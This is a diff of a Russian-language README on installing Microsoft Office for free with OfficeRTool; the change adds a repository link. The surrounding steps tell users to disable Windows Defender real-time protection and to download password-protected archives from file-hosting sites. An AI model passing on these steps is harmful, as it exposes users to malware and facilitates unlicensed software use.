@@ -14,7 +14,7 @@
    - Защита в режиме реального времени (Отключить)
    ![](widows_defender/wd_off_3.png)
 4. Office(R)tool для скачивания с любого сайта:
-   - С моего репозитория ([OfficeRTool.v14.0-2025(2)](OfficeRTool.v14.0-2025(2).rar)), ПАРОЛЬ: `2025`
+   - С моего [репозитория](https://github.com/Un1korm/Free-Install-Microsoft-Office/) ([OfficeRTool.v14.0-2025(2)](OfficeRTool.v14.0-2025(2).rar)), ПАРОЛЬ: `2025`
    - (https://www.mediafire.com/file/6wsko6huw9tbwnz)
    - (https://www.upload.ee/files/15790511/OfficeRTool.7z.html)
 5. Скаченный файл (`OfficeRTool.7z` или `OfficeRTool.rar` или ...) находится под паролем. Как правило автор что-то изменяет в своем проекте или что-то добавляет, так что пароль меняет из года в год. Внимательно читаем раздел статьи `Read me` и находим глазками слово `Password`, рядом с ним должен находиться пароль от файла.
